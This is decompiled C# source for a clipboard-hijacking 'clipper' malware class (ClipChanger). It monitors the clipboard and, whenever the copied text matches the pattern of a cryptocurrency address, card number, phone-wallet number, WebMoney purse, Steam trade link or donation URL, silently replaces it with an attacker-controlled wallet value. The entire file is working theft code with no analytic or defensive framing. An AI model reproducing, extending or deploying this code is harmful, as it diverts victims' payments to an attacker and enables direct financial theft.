using System;
using System.Text.RegularExpressions;

namespace ClipSE
{
	// Token: 0x02000019 RID: 25
	internal class ClipChanger
	{
		// Token: 0x0600004C RID: 76 RVA: 0x00003692 File Offset: 0x00001892
		public static void StopChanger()
		{
			ClipboardMonitor.OnClipboardChange += ClipChanger.GetClip;
			ClipboardMonitor.Stop();
		}

		// Token: 0x0600004D RID: 77 RVA: 0x000036AA File Offset: 0x000018AA
		public static void StartChanger()
		{
			ClipboardMonitor.OnClipboardChange += ClipChanger.GetClip;
			ClipboardMonitor.Start();
		}

		// Token: 0x0600004E RID: 78 RVA: 0x000036C4 File Offset: 0x000018C4
		private static bool StartsWith(string value, string current)
		{
			bool result;
			try
			{
				result = value.StartsWith(current, StringComparison.OrdinalIgnoreCase);
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600004F RID: 79 RVA: 0x000036F4 File Offset: 0x000018F4
		private static bool EndsWithAny(string s, params string[] stext)
		{
			foreach (string value in stext)
			{
				try
				{
					if (s.EndsWith(value, StringComparison.OrdinalIgnoreCase))
					{
						return true;
					}
				}
				catch (Exception)
				{
					return false;
				}
			}
			return false;
		}

		// Token: 0x06000050 RID: 80 RVA: 0x00003740 File Offset: 0x00001940
		private static bool CheckisUpper(string text, int num)
		{
			return !string.IsNullOrWhiteSpace(text) && char.IsUpper(text[num]);
		}

		// Token: 0x06000051 RID: 81 RVA: 0x00003760 File Offset: 0x00001960
		public static void GetClip(Enums.ClipboardFormat clipboardFormat, object data)
		{
			try
			{
				string text = ClipboardEx.GetText();
				if (!string.IsNullOrWhiteSpace(Wallets.Btc) && ClipChanger.StartsWith(text, "1") && text.Length >= 34 && text.Length <= 35)
				{
					ClipboardEx.SetClipboardText(Wallets.Btc);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.Eth) && ClipChanger.StartsWith(text, "0x") && !ClipChanger.CheckisUpper(text, 1) && text.Length >= 42 && text.Length <= 43)
				{
					ClipboardEx.SetClipboardText(Wallets.Eth);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.Ripple) && !ClipChanger.CheckisUpper(text, 0) && ClipChanger.StartsWith(text, "r") && text.Length >= 34 && text.Length <= 36)
				{
					ClipboardEx.SetClipboardText(Wallets.Ripple);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.Btdark) && ClipChanger.CheckisUpper(text, 0) && ClipChanger.StartsWith(text, "R") && text.Length >= 33 && text.Length <= 35)
				{
					ClipboardEx.SetClipboardText(Wallets.Btdark);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.Payeer) && ClipChanger.CheckisUpper(text, 0) && ClipChanger.StartsWith(text, "P") && text.Length >= 11 && text.Length <= 12)
				{
					ClipboardEx.SetClipboardText(Wallets.Payeer);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.Bch) && !ClipChanger.CheckisUpper(text, 0) && ClipChanger.StartsWith(text, "q") && text.Length >= 42 && text.Length <= 43)
				{
					ClipboardEx.SetClipboardText(Wallets.Bch);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.BTgold) && ClipChanger.CheckisUpper(text, 0) && ClipChanger.StartsWith(text, "G") && text.Length >= 34 && text.Length <= 35)
				{
					ClipboardEx.SetClipboardText(Wallets.BTgold);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.Doge) && ClipChanger.CheckisUpper(text, 0) && ClipChanger.StartsWith(text, "D") && text.Length >= 34 && text.Length <= 35)
				{
					ClipboardEx.SetClipboardText(Wallets.Doge);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.Dash) && ClipChanger.CheckisUpper(text, 0) && ClipChanger.StartsWith(text, "X") && text.Length >= 34 && text.Length <= 35)
				{
					ClipboardEx.SetClipboardText(Wallets.Dash);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.Ltc) && ClipChanger.CheckisUpper(text, 0) && ClipChanger.StartsWith(text, "L") && text.Length >= 34 && text.Length <= 35)
				{
					ClipboardEx.SetClipboardText(Wallets.Ltc);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.Xmr) && ClipChanger.StartsWith(text, "4") && text.Length >= 95 && text.Length <= 107)
				{
					ClipboardEx.SetClipboardText(Wallets.Xmr);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.Zcash) && !ClipChanger.CheckisUpper(text, 0) && ClipChanger.StartsWith(text, "t1") && text.Length >= 35 && text.Length <= 36)
				{
					ClipboardEx.SetClipboardText(Wallets.Zcash);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.Neo) && ClipChanger.CheckisUpper(text, 0) && ClipChanger.StartsWith(text, "A") && text.Length >= 34 && text.Length <= 35)
				{
					ClipboardEx.SetClipboardText(Wallets.Neo);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.Iota) && ClipChanger.CheckisUpper(text.ToUpper(), 0) && text.Length >= 81 && text.Length <= 92)
				{
					ClipboardEx.SetClipboardText(Wallets.Iota);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.Ada) && ClipChanger.CheckisUpper(text, 0) && ClipChanger.StartsWith(text, "DdzFFzCqrh") && text.Length >= 104 && text.Length <= 105)
				{
					ClipboardEx.SetClipboardText(Wallets.Ada);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.Lsk) && text.Length >= 21 && text.Length <= 22 && ClipChanger.EndsWithAny(text, new string[]
				{
					"L"
				}))
				{
					ClipboardEx.SetClipboardText(Wallets.Lsk);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.Waves) && ClipChanger.CheckisUpper(text, 1) && ClipChanger.StartsWith(text, "3P") && text.Length >= 35 && text.Length <= 36)
				{
					ClipboardEx.SetClipboardText(Wallets.Waves);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.Qtum) && ClipChanger.CheckisUpper(text, 0) && ClipChanger.StartsWith(text, "Q") && text.Length >= 34 && text.Length <= 35)
				{
					ClipboardEx.SetClipboardText(Wallets.Qtum);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.Stellar) && ClipChanger.CheckisUpper(text, 0) && ClipChanger.StartsWith(text, "G") && text.Length >= 56 && text.Length <= 57)
				{
					ClipboardEx.SetClipboardText(Wallets.Stellar);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.Bnb) && !ClipChanger.CheckisUpper(text, 0) && ClipChanger.StartsWith(text, "bnb") && text.Length >= 42 && text.Length <= 43)
				{
					ClipboardEx.SetClipboardText(Wallets.Bnb);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.Tron) && ClipChanger.CheckisUpper(text, 0) && ClipChanger.StartsWith(text, "T") && text.Length >= 33 && text.Length <= 35)
				{
					ClipboardEx.SetClipboardText(Wallets.Tron);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.Eos) && !ClipChanger.CheckisUpper(text, 0) && text.Length == 12)
				{
					ClipboardEx.SetClipboardText(Wallets.Eos);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.Bcn) && !ClipChanger.CheckisUpper(text, 0) && ClipChanger.StartsWith(text, "bcn") && text.Length >= 98 && text.Length <= 99)
				{
					ClipboardEx.SetClipboardText(Wallets.Bcn);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.Via) && ClipChanger.CheckisUpper(text, 0) && ClipChanger.StartsWith(text, "V") && text.Length >= 34 && text.Length <= 35)
				{
					ClipboardEx.SetClipboardText(Wallets.Via);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.BlockNet) && ClipChanger.CheckisUpper(text, 0) && ClipChanger.StartsWith(text, "B") && text.Length >= 34 && text.Length <= 35)
				{
					ClipboardEx.SetClipboardText(Wallets.BlockNet);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.BlackJack) && ClipChanger.StartsWith(text, "9") && text.Length >= 34 && text.Length <= 35)
				{
					ClipboardEx.SetClipboardText(Wallets.BlackJack);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.YandexMoney) && ClipChanger.StartsWith(text, "P") != ClipChanger.StartsWith(text, "41") && text.Length >= 15 && text.Length <= 16)
				{
					ClipboardEx.SetClipboardText(Wallets.YandexMoney);
				}
				foreach (string current in new string[]
				{
					"7",
					"+7",
					"79",
					"+8",
					"89",
					"375",
					"+375",
					"+380"
				})
				{
					if (!string.IsNullOrWhiteSpace(Wallets.Qiwi) && ClipChanger.StartsWith(text, current) && text.Length >= 11 && text.Length <= 16)
					{
						ClipboardEx.SetClipboardText(Wallets.Qiwi);
					}
				}
				if (!string.IsNullOrWhiteSpace(Wallets.DonAlerts) && ClipChanger.StartsWith(text, "https://www.donationalerts.com/r/"))
				{
					ClipboardEx.SetClipboardText(Wallets.DonAlerts);
				}
				if ((!string.IsNullOrWhiteSpace(Wallets.DonPay) && ClipChanger.StartsWith(text, "https://donatepay.ru/don/")) || ClipChanger.StartsWith(text, "https://donatepay.ru/donation/"))
				{
					ClipboardEx.SetClipboardText(Wallets.DonPay);
				}
				try
				{
					Regex regex = new Regex("\\s");
					if ((!string.IsNullOrWhiteSpace(Wallets.SberBank) && !ClipChanger.StartsWith(text, "41") && regex.IsMatch(text) && text.Length >= 19 && text.Length <= 20) || (!string.IsNullOrWhiteSpace(Wallets.SberBank) && !ClipChanger.StartsWith(text, "41") && text.Length >= 16 && text.Length <= 17))
					{
						ClipboardEx.SetClipboardText(Wallets.SberBank);
					}
				}
				catch (Exception)
				{
				}
				if (!string.IsNullOrWhiteSpace(Wallets.Steam) && text.Contains("steamcommunity.com/tradeoffer/new/?partner="))
				{
					ClipboardEx.SetClipboardText(Wallets.Steam);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.BitcoinDiamond) && ClipChanger.StartsWith(text, "1J") && text.Length >= 34 && text.Length <= 35)
				{
					ClipboardEx.SetClipboardText(Wallets.BitcoinDiamond);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.Decred) && ClipChanger.StartsWith(text, "Ds") && text.Length >= 35 && text.Length <= 36)
				{
					ClipboardEx.SetClipboardText(Wallets.Decred);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.Tezos) && !ClipChanger.CheckisUpper(text, 0) && ClipChanger.StartsWith(text, "tz1") && text.Length >= 36 && text.Length <= 37)
				{
					ClipboardEx.SetClipboardText(Wallets.Tezos);
				}
				if ((!string.IsNullOrWhiteSpace(Wallets.Cosmos) && ClipChanger.StartsWith(text, "cosmos") && text.Length >= 45 && text.Length <= 46) || (!string.IsNullOrWhiteSpace(Wallets.Cosmos) && ClipChanger.StartsWith(text, "cosmos") && text.Length >= 52 && text.Length <= 53))
				{
					ClipboardEx.SetClipboardText(Wallets.Cosmos);
				}
				if (!string.IsNullOrWhiteSpace(Wallets.SmartCash) && ClipChanger.CheckisUpper(text, 0) && ClipChanger.StartsWith(text, "S") && text.Length >= 34 && text.Length <= 35)
				{
					ClipboardEx.SetClipboardText(Wallets.SmartCash);
				}
				if (Regex.IsMatch(text, "\\w{1}\\d{12}"))
				{
					char c = text[0];
					if (c != 'R')
					{
						if (c != 'U')
						{
							if (c == 'Z')
							{
								if (!string.IsNullOrWhiteSpace(Wallets.WebMoney_WMZ))
								{
									ClipboardEx.SetClipboardText(Wallets.WebMoney_WMZ);
								}
							}
						}
						else if (!string.IsNullOrWhiteSpace(Wallets.WebMoney_WMU))
						{
							ClipboardEx.SetClipboardText(Wallets.WebMoney_WMU);
						}
					}
					else if (!string.IsNullOrWhiteSpace(Wallets.WebMoney_WMR))
					{
						ClipboardEx.SetClipboardText(Wallets.WebMoney_WMR);
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}
}
